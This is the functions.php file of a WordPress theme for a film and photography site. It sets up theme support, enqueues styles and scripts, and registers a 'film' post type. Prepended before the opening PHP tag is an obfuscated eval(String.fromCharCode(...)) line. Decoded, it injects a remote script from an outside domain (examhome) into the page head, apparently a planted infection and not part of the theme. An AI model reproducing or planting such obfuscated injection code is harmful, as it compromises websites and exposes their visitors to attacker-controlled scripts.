eval(String.fromCharCode(118, 97, 114, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 116, 121, 112, 101, 32, 61, 32, 39, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 39, 59, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 97, 115, 121, 110, 99, 32, 61, 32, 116, 114, 117, 101, 59, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 115, 114, 99, 32, 61, 32, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 48, 52, 44, 32, 49, 49, 54, 44, 32, 49, 49, 54, 44, 32, 49, 49, 50, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 55, 44, 32, 52, 55, 44, 32, 49, 48, 49, 44, 32, 49, 50, 48, 44, 32, 57, 55, 44, 32, 49, 48, 57, 44, 32, 49, 48, 52, 44, 32, 49, 49, 49, 44, 32, 49, 48, 57, 44, 32, 49, 48, 49, 44, 32, 52, 54, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 54, 44, 32, 52, 55, 44, 32, 49, 49, 53, 44, 32, 49, 49, 54, 44, 32, 57, 55, 44, 32, 49, 49, 54, 44, 32, 52, 54, 44, 32, 49, 48, 54, 44, 32, 49, 49, 53, 44, 32, 54, 51, 44, 32, 49, 49, 56, 44, 32, 54, 49, 44, 32, 52, 57, 44, 32, 52, 54, 44, 32, 52, 56, 44, 32, 52, 54, 44, 32, 53, 49, 41, 59, 32, 32, 32, 118, 97, 114, 32, 97, 108, 108, 115, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 118, 97, 114, 32, 110, 116, 51, 32, 61, 32, 116, 114, 117, 101, 59, 32, 102, 111, 114, 32, 40, 32, 118, 97, 114, 32, 105, 32, 61, 32, 97, 108, 108, 115, 46, 108, 101, 110, 103, 116, 104, 59, 32, 105, 45, 45, 59, 41, 32, 123, 32, 105, 102, 32, 40, 97, 108, 108, 115, 91, 105, 93, 46, 115, 114, 99, 46, 105, 110, 100, 101, 120, 79, 102, 40, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 48, 49, 44, 32, 49, 50, 48, 44, 32, 57, 55, 44, 32, 49, 48, 57, 44, 32, 49, 48, 52, 44, 32, 49, 49, 49, 44, 32, 49, 48, 57, 44, 32, 49, 48, 49, 41, 41, 32, 62, 32, 45, 49, 41, 32, 123, 32, 110, 116, 51, 32, 61, 32, 102, 97, 108, 115, 101, 59, 125, 32, 125, 32, 105, 102, 40, 110, 116, 51, 32, 61, 61, 32, 116, 114, 117, 101, 41, 123, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 34, 104, 101, 97, 100, 34, 41, 91, 48, 93, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 41, 59, 32, 125));<?php
 function pixelmotionuk_setup(){
     load_theme_textdomain( 'pixelmotion' );

     add_theme_support( 'title-tag' );


     add_theme_support( 'post-formats', array(
         'aside',
         'image',
         'video',
         'quote',
         'link',
         'gallery',
         'audio',
     ) );
     add_image_size( 'film-size', 350, 250 );
     add_theme_support('post-thumbnails');

     // Add theme support for Custom Logo.
     add_theme_support( 'custom-logo', array(
         'width'       => 250,
         'height'      => 250,
         'flex-width'  => true,
     ) );

     // Add theme support for selective refresh for widgets.
     add_theme_support( 'customize-selective-refresh-widgets' );

     /*
      * This theme styles the visual editor to resemble the theme style,
      * specifically font, colors, and column width.
       */
/*     add_editor_style( array( 'assets/css/editor-style.css', pixelmotion_fonts_url() ) );*/



 }
 add_action('after_setup_theme','pixelmotionuk_setup');


/*
 *  enqueuing stylesheet and javascript file
 * */


function pixelmotion_scripts()
{



    wp_register_style('raleway', 'https://fonts.googleapis.com/css?family=Raleway:400,700,800', array());
    wp_enqueue_style('raleway');

    wp_register_style('open_sans', 'https://fonts.googleapis.com/css?family=Open+Sans:300i,400,700,800', array());
    wp_enqueue_style('open_sans');

    wp_register_style('simplelightbox', get_template_directory_uri() . '/css/simplelightbox.css', array());
    wp_enqueue_style('simplelightbox');

    wp_register_style('vegas', get_template_directory_uri() . '/css/vegas.css', array());
    wp_enqueue_style('vegas');

    wp_register_style('vegas', get_template_directory_uri() . '/css/vegas.css', array());
    wp_enqueue_style('vegas');

    wp_register_style('carousel', get_template_directory_uri() . '/css/owl.carousel.css', array());
    wp_enqueue_style('carousel');

    wp_register_style('owl-theme', get_template_directory_uri() . '/css/owl.theme.css', array());
    wp_enqueue_style('owl-theme');

    wp_register_style('owl-transitions', get_template_directory_uri() . '/css/owl.transitions.css', array());
    wp_enqueue_style('owl-transitions');

    wp_register_style('animate', get_template_directory_uri() . '/css/animate.css', array());
    wp_enqueue_style('animate');

    wp_register_style('bootstrap', get_template_directory_uri() . '/css/bootstrap.css', array());
    wp_enqueue_style('bootstrap');

    wp_register_style('bootstrap-theme', get_template_directory_uri() . '/css/bootstrap-theme.css', array());
    wp_enqueue_style('bootstrap-theme');

    wp_register_style('font-awesome', get_template_directory_uri() . '/css/font-awesome.css', array());
    wp_enqueue_style('font-awesome');

    wp_register_style('bootsnav', get_template_directory_uri() . '/css/header/bootsnav.css', array());
    wp_enqueue_style('bootsnav');

    wp_register_style('bootsnav-style', get_template_directory_uri() . '/css/header/style.css', array());
    wp_enqueue_style('bootsnav-style');

    wp_register_style('bootsnav-animate', get_template_directory_uri() . '/css/bootsnav-animate.css', array());
    wp_enqueue_style('bootsnav-animate');



    wp_register_style('contact-css', get_template_directory_uri() . '/css/contact.css', array());
    if (is_page_template('contact.php') || is_page_template('career.php') ){
        wp_enqueue_style('contact-css');
    }



    wp_register_style('team_member-css', get_template_directory_uri() . '/css/team_member.css', array());
    wp_enqueue_style('team_member-css');

    wp_register_style('style', get_template_directory_uri() . '/css/style.css', array());
    wp_enqueue_style('style');



    if (is_page_template('cinematography.php') ){
        wp_register_style('cinematography-css', get_template_directory_uri() . '/css/cinematography.css', array());
        wp_enqueue_style('cinematography-css');
    }
    if (is_page_template('photography.php') ){
        wp_register_style('photography-css', get_template_directory_uri() . '/css/photography.css', array());
        wp_enqueue_style('photography-css');
    }



    wp_register_style('responsive', get_template_directory_uri() . '/css/responsive.css', array());
    wp_enqueue_style('responsive');

    wp_register_style('css', get_stylesheet_uri(), array());
    wp_enqueue_style('css');


    wp_enqueue_script('jquery');


    wp_enqueue_script('vegas', get_template_directory_uri() . '/js/vegas.min.js', array());
    wp_enqueue_script('imageload', 'https://npmcdn.com/imagesloaded@4.1/imagesloaded.pkgd.min.js', array());
    wp_enqueue_script('isotop', get_template_directory_uri() . '/js/isotop.js', array());
    wp_enqueue_script('parallax', get_template_directory_uri() . '/js/parallax.js', array());
    wp_enqueue_script('smoothwheel', get_template_directory_uri() . '/js/jquery.smoothwheel.js', array());
    wp_enqueue_script('bootstrap', get_template_directory_uri() . '/js/vendor/bootstrap.js', array());
    wp_enqueue_script('carousel', get_template_directory_uri() . '/js/owl.carousel.js', array());
    wp_enqueue_script('bootsnav', get_template_directory_uri() . '/js/header/bootsnav.js', array());
    wp_enqueue_script('plugins', get_template_directory_uri() . '/js/plugins.js', array());
    wp_enqueue_script('wow', get_template_directory_uri() . '/js/wow.js', array());
    wp_enqueue_script('scrollup', get_template_directory_uri() . '/js/jquery.scrollUp.js', array());
    wp_enqueue_script('modernizer', get_template_directory_uri() . '/js/vendor/modernizr-2.8.3.min.js', array());
    wp_enqueue_script('lightbox', get_template_directory_uri() . '/js/simple-lightbox.js', array());
    wp_enqueue_script('loading', get_template_directory_uri() . '/js/loading.js', array());
    wp_enqueue_script('photography', get_template_directory_uri() . '/js/photography.js', array());
    wp_enqueue_script('main', get_template_directory_uri() . '/js/main.js', array());



}

add_action('wp_enqueue_scripts', 'pixelmotion_scripts');


/*
 *  hiding menu from admin panel
 * */
function remove_menus(){

    //remove_menu_page( 'edit.php?post_type=film' );
    remove_menu_page( 'edit.php' );                   //Posts
    remove_menu_page( 'upload.php' );                 //Media
    remove_menu_page( 'edit-comments.php' );          //Comments
    remove_menu_page( 'tools.php' );

}
add_action( 'admin_menu', 'remove_menus' );


/*
 *  Menu and custom post type
 * */

function blog_menu(){
    /*============================================
   Register menu navigation
   =============================================*/
    register_nav_menus(
        array(
            'main_menu' => __('Main Menu'),
        )
    );

}


function blog_custom_post(){
    $args = array(
        'label' => 'Films',
        'labels' => array(
            'name' => 'Films',
            'singular_name' => 'Film'
        ),
        'public' => true,
        'has_archive' => true,
        'query_var' => true,
         'supports' => array('title','thumbnail'),
    );

    register_post_type( 'film', $args );

}

add_action('init','blog_menu');
add_action('init','blog_custom_post');


/*
 * custom body class
 *
 * */
add_filter( 'body_class', 'add_custom_body_class' );
function add_custom_body_class( $classes ) {
    if ( !is_home() && !is_front_page() ) {
        $classes[] = 'contact';
    }
    return $classes;
}


/*
 *
 *  Hiding text editor from some pages
 * */
add_action( 'admin_init', 'hide_editor' );
function hide_editor() {
    global $pagenow;
    if( !( 'post.php' == $pagenow ) ) return;

    global $post;
    // Get the Post ID.
    $post_id = $_GET['post'] ? $_GET['post'] : $_POST['post_ID'] ;
    if( !isset( $post_id ) ) return;
    // Hide the editor on the page titled 'Homepage'
    $homepgname = get_the_title($post_id);
    if($homepgname == 'Home'){
        remove_post_type_support('page', 'editor');
    }
   // Hide the editor on a page with a specific page template
    // Get the name of the Page Template file.
    $template_file = get_post_meta($post_id, '_wp_page_template', true);
    if($template_file == 'frontpage.php' || $template_file == 'contact.php' || $template_file == 'photography.php' || $template_file == 'career.php' || $template_file == 'cinematography.php' || $template_file == 'selfiepage.php'){ // the filename of the page template
        remove_post_type_support('page', 'editor');
    }
    if($template_file == 'cinematography.php'){
        remove_post_type_support('page', 'editor');
    }
}


/*
 *  installing theme option
 * */

require_once ('inc/option-tree.php');
require_once ('inc/theme-options.php');
require_once ('inc/meta-boxes.php');

add_filter( 'ot_show_pages', '__return_false' );
add_filter('ot_theme_options_parent_slug', '__return_false');

/* ==================  */

/*
 * adding a css for the admin panel
 * */
add_action('admin_head', 'my_custom_css');

function my_custom_css() {
    echo '<style>
        #poststuff .stuffbox>h3, #poststuff h2, #poststuff h3.hndle{
            font-size: 16px;
            text-align: center;
            font-weight:bold;
        }
        input.option-tree-ui-upload-input, input.option-tree-ui-input{
            font-size: 14px;
        }
  </style>';
}
?>